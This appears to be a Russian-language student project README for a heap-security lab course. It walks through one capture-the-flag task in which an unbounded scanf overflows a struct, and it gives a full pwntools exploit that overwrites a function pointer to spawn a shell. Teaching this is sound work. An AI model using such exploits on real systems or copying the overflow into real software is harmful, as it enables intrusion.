# Научно-исследовательская работа. Зимич Григорий Б20-505 
Разработка лабораторного практикума по изучению механизмов защиты динамической памяти.

В папке listings - приведены листинги кода из отчета.
В папке tasks - исходный код решения задач, и пример решения одной из задач.


[Сервис, на котором можно порешать задачи](http://130.193.36.147/)


***

## Пример решения задачи из директории tasks/hBOF2

1) С помощью утилиты checksec проверяем все методы защиты: `checksec binary` (binary - это наш скомпилированный бинарный файл)

Получаем:

```sh
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

У приложения отсутствует механизм защиты **PIE**, значит нам известны адреса функций в бинарном файле.

2) Проанализируем исходный код приложения:

Приложение представляет собой обычное меню, с возможностью изменения имени, возраста, вызова функции *hello()*, вывода информации и выхода.

У нас имеется структура *Person*, и функция *win()* которая дает нам доступ к шеллу.

```C
typedef struct Person{
    char name[32];
    int age;
    void (*greet_func)();
}Person;
```

В структуре имеется 3 поля, одно из которых это указатель на функцию.

Идея в том, чтобы переписать этот указатель, на функцию *win()*, и затем вызвать ее.

Уязвимость находится в выборе опции *Change name*:

```C
case 1:
  printf("Input ur name:\n");
  scanf("%s", person->name);
  printf("Now my name is %s\n\n", person->name);
  continue;
```

Мы можем читать в **person->name** произвольное количество байт, а значит можем переписать поле структуры, которое указывает на функцию *hello()*. 
Осталось только вычислить нужные оффсеты и узнать адрес функции **win()**.

Для этого используем *GDB*:

```sh
archangelPwn> info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010a0  free@plt
0x00000000004010b0  puts@plt
0x00000000004010c0  __stack_chk_fail@plt
0x00000000004010d0  system@plt
0x00000000004010e0  printf@plt
0x00000000004010f0  malloc@plt
0x0000000000401100  __isoc99_scanf@plt
0x0000000000401110  _start
0x0000000000401140  _dl_relocate_static_pie
0x0000000000401150  deregister_tm_clones
0x0000000000401180  register_tm_clones
0x00000000004011c0  __do_global_dtors_aux
0x00000000004011f0  frame_dummy
0x00000000004011f6  win  **<-- Адрес который нам нужен**
0x0000000000401210  menu
0x0000000000401266  hello
0x0000000000401280  main
0x0000000000401484  _fini
```

Теперь зная адрес функции, можно начать составлять пейлоад

```python
payload = b'A' * 32 # Переписываем поле name[32]
payload += b'B' * 8 # Переписываем поле age
payload += p64(win_address) # Заворачиваем в байты адрес функции win()
```

Полный листинг эксплойта:

```python
from pwn import *

win_addr = 0x00000000004011f6

elf = ELF("./binary")

r = elf.process()

pl = b'A' * 32
pl += b'B' * 8
pl += p64(win_addr)

r.sendlineafter(b':\n', b'1')
r.sendlineafter(b':\n', pl)
r.sendlineafter(b':\n', b'3')

r.interactive()
```

Получаем доступ к шеллу, и читаем флаг:
`flag{s1mPL3_H34P_8uFF_0v3RwLF}`

